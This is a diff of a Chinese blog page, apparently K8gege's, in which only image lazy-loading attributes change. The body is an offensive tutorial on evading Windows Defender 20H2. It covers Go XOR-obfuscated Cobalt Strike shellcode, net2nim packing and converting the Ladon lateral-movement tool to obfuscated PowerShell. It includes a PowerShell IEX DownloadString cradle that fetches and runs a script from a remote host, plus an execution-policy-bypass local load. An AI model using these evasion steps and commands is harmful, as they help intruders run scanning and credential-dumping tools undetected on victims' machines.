@@ -69,7 +69,7 @@
     https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
     <div class="main-header-box">
         <a class="header-avatar" href="/" title="K8gege">
-            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" class="lazyload" data-src="/../images/avatar.png">
 			<h3 class="K8tilte">K8哥哥</h3>
         </a>
         <div class="branding">
@@ -201,13 +201,13 @@
         <p>WIN10更新至最新版20H2发现，查杀能力比以前强了不少，特别是针对CS加载.NET程序集或NIM加载.NET的查杀，毕竟你要调用的函数微软很了解，它想拦截想杀还是比较容易的。但是不知道大家有没听说过一个故事“微软的编程工具的开发工程师，编写程序时，也需要查阅文档”，说明什么？微软系统的API很多，是微软写的没错，但又不是一个人自己写的，就算是一个人自己写的，功能那么多，他也根本记不起，用到自己的东西也要查阅文档，就像我用Ladon有时也要查阅文档，这很正常，因为我写过的工具或功能太多，有些久不用，甚至都会忘记我自己写过什么。所以我想说的是，微软就算做杀软，它也不可能做到全面监控，因为参与开发杀软的人，它不可能对微软系统上百万函数了如指掌，越是大型程序，需要的开发人员越多，很多人都只是负责某一模块对整个系统可能只是一只半解，所以Defender虽然查杀能力某些方面有点加强了，但是很多方面它依旧无法查杀，还没达到自己人写的程序就真比其它杀软牛B的地步，那些专门做杀软的，逆向能力很强，有BIN文件对他们来说就相当于源代码，很多人比微软员工还要了解win系统。举个简单的例子，你在某公司工作，有些员工可能你压根都不认识，更别说和公司所有程序员了解他们所写过的代码，微软的操作系统有多少人来写，defender这部门又只有多少人，他们怎么可能把所有函数都了解，就算24小时不吃饭不做任何事，只研究代码也做不到全面查杀或拦截，至少最近几年还比不过很多主流杀软。任何一个杀软能查杀一个全球大量人使用的工具这是应该也是必须的很常规的考验，杀了不代表这杀软就强了，但是不杀它一定是垃圾。如CS，因为全球大量人使用，任何一个杀软杀它都说明不了什么。好了废话不多说，进入正题。</p>
 <h3 id="GO异或加密免杀">GO异或加密免杀</h3>
 <p>使用GO免杀CS的shellcode，生成的dll上线成功执行CMD命令正常，但执行dumplsass等相关高危功能或加载Ladon时被杀，CS直接下线，甚至加载一个只输出hello world的.net程序集也会被杀，这样会导致我们瞬间失去很多后渗透工具插件带来的便利，这是2021.11.19号的病毒库查杀情况。</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_1.PNG"></p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_2.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/win10/20h2_1.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/win10/20h2_2.PNG"></p>
 <p>这种情况怎么解决？CS无法加载Ladon插件，那么我们只能把Ladon传过去了，但测试发现Ladon.exe也被杀，我的发克，竟然还说是木马。</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_3.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/win10/20h2_3.PNG"></p>
 <h3 id="Nim免杀-net"><a target="_blank" rel="noopener" href="http://xn--Nim-dt1el71h.net">Nim免杀.net</a></h3>
 <p>9月份的时候该方法针对Denfender还是可以的，所以我们可以尝试一下。使用net2nim工具将.net程序转换成bytes，并使用nim加载编译生成新程序,可过一些杀软及旧版Win10 Defender，如图所示</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_4.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/win10/20h2_4.PNG"></p>
 <h4 id="安装Nim">安装Nim</h4>
 <p><a target="_blank" rel="noopener" href="https://nim-lang.org/">https://nim-lang.org/</a><br>
 下载zip大约20M<br>
@@ -217,23 +217,23 @@
 <h4 id="net2nim免杀-net程序">net2nim免杀.net程序</h4>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net2nim Ladon.exe out.exe</span><br></pre></td></tr></tbody></table></figure>
 <p>使用Nim加载.net程序集也可以免杀不少杀软，在此版本之前也可过Defender，但Win10更新至20H2后虽然静态不杀，但一执行会被拦截，提示CLR加载错误，程序也不杀，但无法使用其功能，相当于免杀失败。</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_5.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/win10/20h2_5.PNG"></p>
 <h3 id="使用LadonGUI免杀-NET程序">使用LadonGUI免杀.NET程序</h3>
 <p>怎么办？我们需要Ladon扫描内网或进行横向移动，但是EXE被杀了，还有办法吗?答案是有的，记得文章开头说过的话吗，Defender在某些方面是杀能力还是比较差的，如powershell、VBS、java、php啊等脚本类语言，不只是它在这方面，其它专做杀软的在这方面也不是很强。去年发布的Ladon 7.5的GUI版本开始就提供有一些PowerShell加密混淆方法，也包含了EXE转PowerShell，PowerShell转EXE功能，也发布过如何将EXE转成PowerShell的教程，以免杀最新版Ladon为例,首先将ladon.exe拖放至exe/dll(.net)文本框中，然后点击右边的"EXE-&gt;PowerShell"按钮，成功会生成Ladon.ps1，如果你只打算把PS1放在win10机器上使用，也可以转Ladon40.exe,毕竟有几个模块只支持.net4.0，当然转换其它.NET程序也一样。</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_6.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/win10/20h2_6.PNG"></p>
 <p>生成的PS1内容如下，已做好加载，如果是你自己写的程序，只需在第8行开始加入相关参数调用即可。若是Ladon请使用记事本打开ps1文件，复制红线所示@和@里的字符串很长可能有2M<br>
-<img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_7.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/win10/20h2_7.PNG"></p>
 <p>再打开Ladon9.0.ps1或Ladon9.1.ps1找到里面那个很长的加密字符串，将刚转换的加密字符串粘贴替换，注意长度那里也需要替换，大小不对应也会导致PS1加载失败。<br>
-<img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_8.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/win10/20h2_8.PNG"></p>
 <p>若发现哪些模块不可使用，可自行参考WIKI，将缺少的模块名称参数加入<br>
-<img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_9.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/win10/20h2_9.PNG"></p>
 <p>转换完成后，我们再测一下20H2的Defender,免杀成功，可以嗨起来了。无论使用远程还是本地加载Ladon.ps1，Defender都不杀了。</p>
 <h3 id="远程加载免杀">远程加载免杀</h3>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></tbody></table></figure>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_10.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/win10/20h2_10.PNG"></p>
 <h3 id="本地加载免杀">本地加载免杀</h3>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -<span class="built_in">exec</span> bypass Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></tbody></table></figure>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_11.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/win10/20h2_11.PNG"></p>
 <p>还有另外一个方法，就是自行免杀LadonGo，开源支持全平台。</p>
 <h3 id="小结">小结</h3>
 <p>大家也可以按照该方法，免杀其它.net写的工具，像Ladon这样一百多个功能的程序都能免杀，相信大部份.net写的程序，应该都能免杀，除非是被Defender重点针对的工具，如mimikat。</p>
@@ -257,7 +257,7 @@ PowerLadon: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Po
     
     <div class="reward" ontouchstart="">
     <div class="reward-wrap">
-	<img height="180" width="180" data-original="../images/k8join2.png">
+	<img height="180" width="180" class="lazyload" data-src="../images/k8join2.png">
 
     </div>
     <p class="reward-tip">
